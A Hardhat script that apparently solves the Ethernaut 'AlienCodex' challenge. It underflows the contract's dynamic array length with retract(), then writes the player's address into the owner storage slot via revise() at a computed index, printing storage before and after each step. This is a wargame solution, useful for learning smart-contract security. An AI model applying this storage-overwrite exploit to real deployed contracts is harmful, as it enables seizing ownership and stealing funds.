// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";
import Web3 from "web3"

async function main() {
  const INSTANCE_ADDRESS = "0x03ec3b429A2dA58A3fFD19e8dff57EEb66ECEd45"

  const printStorage = async () => {
    const slot1 = await ethers.provider.getStorageAt(INSTANCE_ADDRESS, 0)
    const slot2 = await ethers.provider.getStorageAt(INSTANCE_ADDRESS, 1)
    const slot3 = await ethers.provider.getStorageAt(INSTANCE_ADDRESS, 2)
    const slot4 = await ethers.provider.getStorageAt(INSTANCE_ADDRESS, 3)
    const slot5 = await ethers.provider.getStorageAt(INSTANCE_ADDRESS, 4)
    const slot6 = await ethers.provider.getStorageAt(INSTANCE_ADDRESS, 5)


    console.log(slot1)
    console.log(slot2)
    console.log(slot3)
    console.log(slot4)
    console.log(slot5)
    console.log(slot6)
  }


  const alienCodex = await ethers.getContractAt("AlienCodex", INSTANCE_ADDRESS)
  const [player] = await ethers.getSigners()
  await printStorage()

  const makeContactTx = await alienCodex.make_contact()
  makeContactTx.wait(4)
  console.log("SUCESS SET CONTRACT EQUALS TRUE")
  await printStorage()

  // pop underflow
  const popOnce = await alienCodex.retract()
  await popOnce.wait(4)
  console.log("SUCCESS TRIGGER UNDERFLOW")
  await printStorage()

  const payload = "0x" + "0".repeat(64 - (1 + 40)) + "1" + player.address.slice(2)
  const magicIndex = "0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a"
  const reviseTx = await alienCodex.revise(magicIndex, payload)
  await reviseTx.wait(4)
  await printStorage()

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
